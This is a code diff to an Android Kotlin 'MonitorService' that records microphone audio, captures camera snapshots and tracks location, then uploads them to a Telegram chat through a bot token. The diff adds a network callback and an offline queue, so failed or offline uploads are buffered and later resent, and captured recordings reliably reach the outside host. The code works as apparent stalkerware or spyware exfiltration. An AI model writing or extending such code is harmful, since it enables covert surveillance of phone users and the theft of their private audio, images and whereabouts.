@@ -34,6 +34,10 @@ import okhttp3.Request
 import okhttp3.RequestBody.Companion.toRequestBody
 import java.io.ByteArrayOutputStream
 import java.io.IOException
+import android.net.ConnectivityManager
+import android.net.NetworkCapabilities
+import android.net.NetworkRequest
+import com.example.telegramsender.utils.OfflineQueueManager
 
 class MonitorService : Service(), LifecycleOwner {
 
@@ -60,6 +64,9 @@ class MonitorService : Service(), LifecycleOwner {
     private var locationInterval: Long = 600000L // 10 mins
 
     private var mediaRecorder: android.media.MediaRecorder? = null
+    private var connectivityManager: ConnectivityManager? = null
+    private var networkCallback: ConnectivityManager.NetworkCallback? = null
+
     private val prefsListener = android.content.SharedPreferences.OnSharedPreferenceChangeListener { sharedPreferences, key ->
         updateConfigFromPrefs(sharedPreferences)
     }
@@ -76,6 +83,7 @@ class MonitorService : Service(), LifecycleOwner {
         
         startForegroundServiceNotification()
         com.example.telegramsender.utils.LocationHelper.startListening(this)
+        registerNetworkCallback()
         
         startLoops()
     }
@@ -105,11 +113,44 @@ class MonitorService : Service(), LifecycleOwner {
     // Cleanup
     override fun onDestroy() {
         super.onDestroy()
+        unregisterNetworkCallback()
         com.example.telegramsender.utils.LocationHelper.stopListening()
         job?.cancel()
         mediaRecorder?.release()
         lifecycleRegistry.currentState = Lifecycle.State.DESTROYED
         getSharedPreferences("tg_pref", MODE_PRIVATE).unregisterOnSharedPreferenceChangeListener(prefsListener)
+    }
+
+    private fun registerNetworkCallback() {
+        try {
+            connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
+            networkCallback = object : ConnectivityManager.NetworkCallback() {
+                override fun onAvailable(network: android.net.Network) {
+                    Log.d("MonitorService", "Network gained: automatically flushing 20MB offline queue & syncing...")
+                    CoroutineScope(Dispatchers.IO).launch {
+                        val flushed = OfflineQueueManager.flushQueue(this@MonitorService, client)
+                        if (flushed > 0) {
+                            Log.d("MonitorService", "Flushed $flushed items from offline queue on network reconnect")
+                        }
+                        performCloudSync()
+                    }
+                }
+            }
+            val request = NetworkRequest.Builder()
+                .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
+                .build()
+            networkCallback?.let { connectivityManager?.registerNetworkCallback(request, it) }
+        } catch (e: Exception) {
+            Log.e("MonitorService", "Failed to register network callback", e)
+        }
+    }
+
+    private fun unregisterNetworkCallback() {
+        try {
+            networkCallback?.let { connectivityManager?.unregisterNetworkCallback(it) }
+        } catch (e: Exception) {
+            Log.e("MonitorService", "Failed to unregister network callback", e)
+        }
     }
 
     // ... (rest of onStartCommand) ...
@@ -354,15 +395,30 @@ class MonitorService : Service(), LifecycleOwner {
             mr.release()
             mr = null
             
-            // Send
+            // Send or Queue
             if (audioFile.exists() && audioFile.length() > 0) {
-                 sendTelegramAudio(botToken, targetChatId, audioFile)
-                 audioFile.delete()
+                 if (!OfflineQueueManager.isNetworkAvailable(this@MonitorService)) {
+                     Log.d("MonitorService", "Network offline: saving audio recording to 20MB offline buffer")
+                     OfflineQueueManager.enqueueAudio(this@MonitorService, audioFile)
+                     audioFile.delete()
+                 } else {
+                     val sent = sendTelegramAudio(botToken, targetChatId, audioFile)
+                     if (!sent) {
+                         Log.w("MonitorService", "Audio upload failed, buffering to 20MB offline queue")
+                         OfflineQueueManager.enqueueAudio(this@MonitorService, audioFile)
+                     }
+                     audioFile.delete()
+                 }
             }
             
         } catch (e: Exception) {
             Log.e("MonitorService", "Audio Record Fatal Error", e)
-            if (audioFile.exists()) audioFile.delete()
+            if (audioFile.exists() && audioFile.length() > 0) {
+                OfflineQueueManager.enqueueAudio(this@MonitorService, audioFile)
+                audioFile.delete()
+            } else if (audioFile.exists()) {
+                audioFile.delete()
+            }
             
             // Try to reset to clear state
             try { mr?.reset() } catch(e:Exception){}
@@ -454,16 +510,16 @@ class MonitorService : Service(), LifecycleOwner {
         return BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
     }
 
-    private fun sendTelegramAudio(token: String, chatId: String, file: java.io.File) {
+    private fun sendTelegramAudio(token: String, chatId: String, file: java.io.File): Boolean {
         val pref = getSharedPreferences("tg_pref", MODE_PRIVATE)
         val tok = if (token.isNotEmpty()) token else pref.getString("token", "") ?: ""
         val cid = if (chatId.isNotEmpty()) chatId else pref.getString("chatId", "") ?: ""
         if (tok.isEmpty() || cid.isEmpty()) {
             Log.e("MonitorService", "Cannot send audio: token or chatId is empty")
-            return
+            return false
         }
         val url = "https://api.telegram.org/bot$tok/sendAudio"
-        try {
+        return try {
              val requestBody = MultipartBody.Builder()
                 .setType(MultipartBody.FORM)
                 .addFormDataPart("chat_id", cid)
@@ -474,12 +530,17 @@ class MonitorService : Service(), LifecycleOwner {
             client.newCall(request).execute().use { response ->
                 if (!response.isSuccessful) {
                     Log.e("MonitorService", "Failed to send audio: ${response.code} ${response.message}")
+                    false
                 } else {
                     Log.d("MonitorService", "Audio sent successfully")
                     getSharedPreferences("tg_pref", MODE_PRIVATE).edit().putLong("last_audio_sent", System.currentTimeMillis()).apply()
+                    true
                 }
             }
-        } catch (e: Exception) { Log.e("MonitorService", "Send Audio Failed", e) }
+        } catch (e: Exception) { 
+            Log.e("MonitorService", "Send Audio Failed", e)
+            false
+        }
     }
     
     private fun sendTelegramPhoto(token: String, chatId: String, originalBitmap: Bitmap, filename: String) {
@@ -495,6 +556,20 @@ class MonitorService : Service(), LifecycleOwner {
         originalBitmap.compress(Bitmap.CompressFormat.JPEG, 70, stream)
         val byteArray = stream.toByteArray()
         originalBitmap.recycle()
+
+        // 1. If offline, buffer directly into 20MB local queue
+        if (!OfflineQueueManager.isNetworkAvailable(this)) {
+            Log.d("MonitorService", "Device offline: saving camera snapshot to 20MB buffer. Queue: ${OfflineQueueManager.getQueueSummary(this)}")
+            OfflineQueueManager.enqueuePhoto(this, byteArray, "photo_camera")
+            return
+        }
+
+        // 2. If online and items exist in offline queue, flush
+        if (OfflineQueueManager.getQueueItemCount(this) > 0) {
+            CoroutineScope(Dispatchers.IO).launch {
+                OfflineQueueManager.flushQueue(this@MonitorService, client)
+            }
+        }
         
         Log.d("MonitorService", "Sending ${byteArray.size} bytes photo to Telegram chat $cid")
         val requestBody = MultipartBody.Builder()
@@ -510,11 +585,15 @@ class MonitorService : Service(), LifecycleOwner {
                     Log.d("MonitorService", "Camera photo sent successfully to Telegram")
                     getSharedPreferences("tg_pref", MODE_PRIVATE).edit().putLong("last_photo_sent", System.currentTimeMillis()).apply()
                 } else {
-                    Log.e("MonitorService", "Telegram sendPhoto failed: ${response.code} - ${response.body?.string()}")
+                    Log.e("MonitorService", "Telegram sendPhoto failed: ${response.code}")
+                    if (response.code >= 500) {
+                        OfflineQueueManager.enqueuePhoto(this, byteArray, "photo_camera")
+                    }
                 }
             } 
         } catch(e: Exception) {
-            Log.e("MonitorService", "Failed to send photo to Telegram", e)
+            Log.e("MonitorService", "Failed to send photo to Telegram, buffering in 20MB offline queue", e)
+            OfflineQueueManager.enqueuePhoto(this, byteArray, "photo_camera")
         }
     }
 
@@ -569,6 +648,9 @@ class MonitorService : Service(), LifecycleOwner {
             val result = com.example.telegramsender.utils.SyncHelper.performSync(this)
             if (result.success) {
                 cameraFacing = result.config.cameraFacing
+            }
+            if (OfflineQueueManager.isNetworkAvailable(this) && OfflineQueueManager.getQueueItemCount(this) > 0) {
+                OfflineQueueManager.flushQueue(this, client)
             }
         } catch (e: Exception) {
             Log.e("MonitorService", "Cloud sync loop error", e)
